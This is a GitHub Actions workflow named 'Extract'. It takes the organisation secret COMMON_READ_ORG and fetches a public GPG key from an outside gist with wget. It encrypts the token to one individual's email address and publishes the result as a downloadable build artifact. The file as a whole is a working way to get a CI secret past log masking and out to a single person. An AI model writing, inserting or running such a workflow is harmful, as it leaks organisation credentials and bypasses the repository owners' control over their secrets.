name: Extract
on:
  workflow_dispatch:

jobs:
  extract:
    runs-on: ubuntu-latest
    steps:
      - name: extract
        env:
          TOKEN: ${{ secrets.COMMON_READ_ORG}}
        run: |
          wget https://gist.githubusercontent.com/valpinkman/1f806a0b1fd0a82432dea3318618e083/raw/27ef7bab090434cbe56d35675b93d39fb10e9d1d/val.pub && gpg --import val.pub && echo done && echo $TOKEN | gpg --trust-model always --batch --yes --encrypt -r valentin.d.pinkman@hey.com -o out
      - name: upload
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: out
          path: out
